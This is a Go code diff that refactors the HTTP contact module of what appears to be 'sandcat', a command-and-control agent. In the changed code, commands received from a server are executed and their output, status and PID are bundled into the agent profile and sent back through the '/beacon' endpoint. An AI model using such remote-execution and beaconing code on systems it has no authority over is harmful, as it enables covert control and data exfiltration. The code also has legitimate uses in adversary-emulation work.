@@ -17,7 +17,6 @@ import (
 
 var (
 	apiBeacon = "/beacon"
-	apiResult = "/result"
 )
 
 //API communicates through HTTP
@@ -62,14 +61,18 @@ func (contact API) DropPayloads(payload string, server string, uniqueId string) 
 //RunInstruction runs a single instruction
 func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
     timeout := int(command["timeout"].(float64))
-	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
-	sendExecutionResults(command["id"], profile["server"], result, status, cmd, pid)
+	result := make(map[string]interface{})
+	output, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
+	result["id"] = command["id"]
+	result["output"] = output
+	result["status"] = status
+	result["pid"] = pid
+ 	sendExecutionResults(profile, result)
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
 func (contact API) C2RequirementsMet(criteria map[string]string) bool {
 	output.VerbosePrint(fmt.Sprintf("Beacon API=%s", apiBeacon))
-	output.VerbosePrint(fmt.Sprintf("Result API=%s", apiResult))
 	return true
 }
 
@@ -90,10 +93,11 @@ func drop(server string, payload string) string {
 	return location
 }
 
-func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string) {
-	address := fmt.Sprintf("%s%s", server, apiResult)
-	link := fmt.Sprintf("%s", commandID.(string))
-	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
+func sendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
+	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
+	profileCopy := profile
+	profileCopy["result"] = result
+	data, _ := json.Marshal(profileCopy)
 	request(address, data)
 }
 
